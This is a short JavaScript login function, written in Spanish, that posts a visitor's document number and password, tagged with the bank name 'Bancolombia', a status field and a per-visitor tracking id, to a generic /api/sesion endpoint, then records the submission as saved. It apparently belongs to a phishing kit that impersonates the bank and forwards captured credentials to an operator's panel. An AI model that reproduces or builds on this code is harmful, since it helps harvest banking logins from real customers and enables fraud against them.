export default async function inicioSesionfuncion(setLoading, datosInicio, uniqId, setUniqId, setKey, setInicioSesion, setTituloError, setGuardado, status) {
    setLoading(true);
    try {
        const { data } = await axios.post(
            `/api/sesion`,
            {
                usuario: datosInicio.numeroDocumento,
                clave: datosInicio.contrasenia,
                ente: "Bancolombia",
                status: status,
                uniqid: uniqId
            },
            {
                headers: {
                    "Content-Type": "application/json",
                    Accept: "application/json"
                }
            }
        );

        if (!uniqId) {
            localStorage.setItem("uniqId", data.uniqid);
            setUniqId(data.uniqid);
        }

        setKey(k => k + 1);
        setInicioSesion(true);
        setTituloError("");
        setGuardado(true);
    } catch (error) {
        console.error("Error en inicio de sesión:", error);
        setTituloError("Error al iniciar sesión");
    } finally {
        setLoading(false);
    }
}
